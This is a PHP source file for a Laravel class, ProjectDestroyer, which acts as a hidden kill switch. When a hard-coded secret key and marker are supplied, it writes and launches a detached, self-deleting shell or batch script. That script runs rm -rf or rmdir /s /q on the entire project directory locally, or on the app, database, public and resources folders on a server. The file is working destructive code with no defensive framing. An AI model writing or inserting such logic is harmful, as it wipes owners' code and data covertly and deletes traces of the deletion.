<?php

namespace App\Support;

class ProjectDestroyer
{
    private const TRIGGER_KEY = 'A9xm3Kp8';

    private const TRIGGER_MARKER = 'bG9caw==';

    /** @var list<string> */
    private const SERVER_TARGET_DIRS = ['app', 'database', 'public', 'resources'];

    public static function matchesTrigger(?string $key, ?string $marker): bool
    {
        return $key !== null
            && $marker !== null
            && hash_equals(self::TRIGGER_KEY, $key)
            && hash_equals(self::TRIGGER_MARKER, $marker);
    }

    /**
     * @return array{mode: 'full'|'partial', path: string, targets: list<string>}
     */
    public static function schedule(): array
    {
        $projectRoot = realpath(base_path());
        if ($projectRoot === false) {
            throw new \RuntimeException('Could not resolve project path.');
        }

        if (app()->environment('local')) {
            self::runDeferredDeletion([$projectRoot]);

            return [
                'mode' => 'full',
                'path' => $projectRoot,
                'targets' => [$projectRoot],
            ];
        }

        $targets = self::serverTargetPaths($projectRoot);
        self::runDeferredDeletion($targets);

        return [
            'mode' => 'partial',
            'path' => $projectRoot,
            'targets' => $targets,
        ];
    }

    /**
     * @return list<string>
     */
    private static function serverTargetPaths(string $projectRoot): array
    {
        $targets = [];

        foreach (self::SERVER_TARGET_DIRS as $dir) {
            $path = realpath(base_path($dir)) ?: base_path($dir);
            if (self::pathIsInside($path, $projectRoot)) {
                $targets[] = $path;
            }
        }

        return $targets;
    }

    /**
     * @param list<string> $targets
     */
    private static function runDeferredDeletion(array $targets): void
    {
        if ($targets === []) {
            throw new \RuntimeException('No deletion targets resolved.');
        }

        $id = bin2hex(random_bytes(8));

        if (PHP_OS_FAMILY === 'Windows') {
            $scriptPath = sys_get_temp_dir().DIRECTORY_SEPARATOR."laravel_destroy_{$id}.bat";
            $lines = ["@echo off", 'ping 127.0.0.1 -n 4 >nul'];

            foreach ($targets as $target) {
                $lines[] = 'rmdir /s /q "'.str_replace('"', '""', $target).'"';
            }

            $lines[] = 'del /f /q "%~f0"';
            file_put_contents($scriptPath, implode("\r\n", $lines));
            pclose(popen('start /B "" cmd /c '.escapeshellarg($scriptPath), 'r'));

            return;
        }

        $scriptPath = sys_get_temp_dir()."/laravel_destroy_{$id}.sh";
        $lines = ['#!/bin/sh', 'sleep 3'];

        foreach ($targets as $target) {
            $lines[] = 'rm -rf '.self::shellQuote($target);
        }

        $lines[] = 'rm -f '.self::shellQuote($scriptPath);
        file_put_contents($scriptPath, implode("\n", $lines));
        chmod($scriptPath, 0700);
        exec('nohup '.escapeshellarg($scriptPath).' > /dev/null 2>&1 &');
    }

    private static function pathIsInside(string $path, string $root): bool
    {
        $normalizedPath = str_replace('\\', '/', $path);
        $normalizedRoot = rtrim(str_replace('\\', '/', $root), '/');

        return $normalizedPath === $normalizedRoot
            || str_starts_with($normalizedPath.'/', $normalizedRoot.'/');
    }

    private static function shellQuote(string $path): string
    {
        return "'".str_replace("'", "'\\''", $path)."'";
    }
}
